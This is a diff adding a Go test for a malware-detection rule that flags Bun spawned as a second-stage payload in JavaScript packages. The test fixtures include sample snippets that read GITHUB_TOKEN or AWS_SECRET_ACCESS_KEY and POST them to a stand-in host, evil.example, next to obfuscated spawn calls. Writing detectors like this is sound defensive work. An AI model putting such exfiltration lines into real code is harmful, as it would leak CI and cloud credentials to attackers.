@@ -2440,3 +2440,223 @@ if (m.includes(process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN)) {}
 		seenLines[f.Line] = f.RuleID
 	}
 }
+
+// TestBunSecondStage covers JS_BUN_SECOND_STAGE_001: Bun used as a
+// suspicious second stage. Execution alone never fires; a partner signal
+// (download, obfuscation, CI secret read, exfil sink, staged write) is
+// required, and a CI secret read + exfil sink escalates to CRITICAL.
+func TestBunSecondStage(t *testing.T) {
+	cases := []struct {
+		name    string
+		content string
+		want    bool
+		crit    bool // when want, assert CRITICAL (else HIGH)
+	}{
+		{
+			name: "spawn bun + obfuscator shape",
+			content: `const cp = require('child_process');
+while(!![]){ var _0xabc = 1; }
+cp.spawn('bun', ['./stage.mjs']);`,
+			want: true,
+		},
+		{
+			name: "bun exec + GITHUB_TOKEN read + network sink -> CRITICAL",
+			content: `const cp = require('child_process');
+cp.spawn('bun', ['./x.mjs']);
+const t = process.env.GITHUB_TOKEN;
+fetch('https://evil.example/c', { method: 'POST', body: t });`,
+			want: true,
+			crit: true,
+		},
+		{
+			// Multi-declarator alias (cp bound to child_process in a comma
+			// list) + a network sink. Proves the alias collector binds the
+			// multi-var form and the network-call partner is strong. Uses a
+			// literal payload target (a variable target is the documented
+			// precision tradeoff below).
+			name: "multi-var cp.spawn bun + network sink",
+			content: `const fs = require('fs'), os = require('os'), cp = require('child_process');
+cp.spawn('bun', ['./stage.mjs']);
+fetch('https://evil.example/c', { method: 'POST' });`,
+			want: true,
+		},
+		{
+			// Precision tradeoff: a bun launch whose payload is a VARIABLE
+			// (not a literal path/.js/-e) is not matched, so a benign
+			// `spawn('bun', [subcmd])` cannot be mistaken for a payload run.
+			// Recall cost: a malicious variable-target spawn is missed.
+			name: "spawn bun with variable target is not matched (precision tradeoff)",
+			content: `const cp = require('child_process');
+const p = computePath();
+cp.spawn('bun', [p]);
+fetch('https://evil.example/c', { method: 'POST' });`,
+			want: false,
+		},
+		{
+			name: "exec string form (bun run inside execSync) + network sink",
+			content: `const cp = require('child_process');
+cp.execSync('bun run ./stage.mjs');
+fetch('https://evil.example/c', { method: 'POST' });`,
+			want: true,
+		},
+		{
+			name: "shelljs alias exec bun run + secret + sink -> CRITICAL",
+			content: `const sh = require('shelljs');
+sh.exec('bun run ./stage.mjs');
+const t = process.env.AWS_SECRET_ACCESS_KEY;
+fetch('https://evil.example/c', { body: t });`,
+			want: true,
+			crit: true,
+		},
+		// --- false positives: Bun used legitimately, no partner ---
+		{
+			// A `bun run ...` command in a COMMENT is not execution, even
+			// alongside a real fetch() partner. Anchoring the string form to
+			// an exec wrapper keeps this quiet.
+			name: "bun run in a comment + fetch is not execution",
+			content: `// deploy step: bun run ./stage.mjs
+fetch('https://example.com/health');`,
+			want: false,
+		},
+		{
+			// A fully COMMENTED exec call must not count as execution even
+			// though it textually matches the exec-wrapper regex.
+			name: "commented-out execSync(bun run) + fetch is not execution",
+			content: `// cp.execSync('bun run ./stage.mjs');
+fetch('https://example.com/health');`,
+			want: false,
+		},
+		{
+			// A stringified example (the exec keyword itself inside a
+			// string) is documentation, not execution.
+			name: "stringified exec example + fetch is not execution",
+			content: `const usage = "cp.execSync('bun run ./stage.mjs')";
+fetch('https://example.com/health');`,
+			want: false,
+		},
+		{
+			name:    "bun test alone",
+			content: `require('child_process').spawn('bun', ['test']);`,
+			want:    false,
+		},
+		{
+			name:    "bun run build alone",
+			content: `require('child_process').spawn('bun', ['run', 'build']);`,
+			want:    false,
+		},
+		{
+			name: "doc string mentioning bun.sh, no execution",
+			content: `// To develop locally, install Bun from bun.sh first.
+module.exports = { name: 'lib' };`,
+			want: false,
+		},
+		{
+			name:    "bun --version probe",
+			content: `require('child_process').execSync('bun --version');`,
+			want:    false,
+		},
+		{
+			name:    "setup-bun reference in JS, no payload",
+			content: `const action = 'oven-sh/setup-bun'; // CI helper name only`,
+			want:    false,
+		},
+		{
+			// `.exec` on a non-child_process object (a DB handle) is not a
+			// process launch, even with a partner present.
+			name: "db.exec is not a process launch",
+			content: `const db = require('better-sqlite3')('x.db');
+db.exec('bun run migration.js');
+fetch('https://example.com/health');`,
+			want: false,
+		},
+		{
+			// "bun" as a DATA argument (not the program) is not execution.
+			name: "bun as data argument to echo is not execution",
+			content: `const cp = require('child_process');
+cp.spawn('echo', ['bun']);
+fetch('https://example.com/health');`,
+			want: false,
+		},
+		{
+			// A bun COMMAND STRING passed as data to a program API (echo is
+			// the program; "bun run ..." is just an argument) is not a Bun
+			// launch -- only exec/execSync take a whole shell command string.
+			name: "bun command string as data to echo spawn is not execution",
+			content: `const cp = require('child_process');
+cp.spawn('echo', ['bun run ./stage.mjs']);
+fetch('https://example.com/health');`,
+			want: false,
+		},
+		{
+			// A file that imports shelljs but runs bun via an UNRELATED
+			// .exec receiver (a DB handle) is not a shelljs launch.
+			name: "shelljs imported but db.exec runs bun string",
+			content: `const sh = require('shelljs');
+const db = require('better-sqlite3')('x.db');
+db.exec('bun run migration.js');
+fetch('https://example.com/health');`,
+			want: false,
+		},
+		{
+			// A user-defined helper named exec is not a child_process /
+			// execa / shelljs binding, so it does not count as execution.
+			name: "user-defined exec helper is not a process launch",
+			content: `function exec(s) { return s.length; }
+exec('bun run ./stage.mjs');
+fetch('https://example.com/health');`,
+			want: false,
+		},
+		{
+			// Program-literal form via a user-defined spawn: spawn('bun') is
+			// not a real process API unless spawn is bound to child_process.
+			name: "user-defined spawn helper with 'bun' arg is not a launch",
+			content: `function spawn(p) { return p; }
+spawn('bun');
+fetch('https://example.com/health');`,
+			want: false,
+		},
+		{
+			// Destructured child_process spawn IS a real launch (TP), to
+			// prove the bound path catches the program-literal form. Paired
+			// with an obfuscator-shape payload (strong partner).
+			name: "destructured child_process spawn bun + obfuscation",
+			content: `const { spawn } = require('child_process');
+while(!![]){ var _0xabc = 1; }
+spawn('bun', ['./stage.mjs']);`,
+			want: true,
+		},
+		{
+			// Accepted tradeoff (stop-rule): Bun execution + a download URL
+			// or chmod/writeFileSync that appears ONLY as a string/doc, with
+			// no strong partner, does not fire. These string-presence
+			// signals were dropped as standalone partners.
+			name: "bun run build + download URL only in a string is not a finding",
+			content: `const cp = require('child_process');
+cp.spawn('bun', ['run', 'build']);
+console.error('Install Bun from https://bun.sh/install');`,
+			want: false,
+		},
+		{
+			name: "bun exec + chmod/writeFileSync only in a doc string is not a finding",
+			content: `const cp = require('child_process');
+cp.spawn('bun', ['run', './stage.mjs']);
+const help = 'chmod after fs.writeFileSync to stage the bundle';`,
+			want: false,
+		},
+	}
+	for _, c := range cases {
+		t.Run(c.name, func(t *testing.T) {
+			findings := analyze(t, "index.js", c.content)
+			got := hasRule(findings, RuleBunSecondStage)
+			if got != c.want {
+				t.Fatalf("JS_BUN_SECOND_STAGE_001 present = %v, want %v (findings: %+v)", got, c.want, findings)
+			}
+			if c.want && c.crit {
+				f := findRule(findings, RuleBunSecondStage)
+				if f == nil || f.Severity != types.SeverityCritical {
+					t.Errorf("expected CRITICAL, got %+v", f)
+				}
+			}
+		})
+	}
+}
